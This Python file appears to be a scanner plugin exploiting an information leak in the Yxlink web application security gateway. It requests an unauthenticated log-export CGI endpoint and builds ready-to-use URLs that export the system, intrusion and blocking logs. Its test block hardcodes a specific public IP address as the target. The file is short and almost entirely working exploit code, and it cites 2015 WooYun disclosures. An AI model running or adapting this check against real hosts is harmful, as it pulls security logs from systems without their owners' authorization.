#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-098450\http://www.wooyun.org/bugs/wooyun-2015-0134150
'''
修改请求中的type参数1～13共13种日志，此处紧验证存在此漏洞，给出3种较重要日志地址。
'''
import urlparse

def assign(service, arg):
    if service == "yxlink": 
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'cgi-pub/exportdata.cgi?type=1&begintime=20150101&endtime=20150102'
    exp1='系统日志:'+arg+'cgi-pub/exportdata.cgi?type=3&begintime=20150101&endtime=20150102'
    exp2='入侵记录日志:'+arg+'cgi-pub/exportdata.cgi?type=1&begintime=20150101&endtime=20151218'
    exp3='阻断日志:'+arg+'cgi-pub/exportdata.cgi?type=12&begintime=20150101&endtime=20151218'
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and 'Attack Time' in res and 'Action' in res:
        security_hole("铱迅web应用安全网关信息泄漏,参照：wooyun-2015-098450，wooyun-2015-0134150\n%s\n%s\n%s"%(exp1,exp2,exp3))


if __name__ == '__main__':
    from dummy import *
    audit(assign('yxlink', 'https://60.191.100.179/')[1])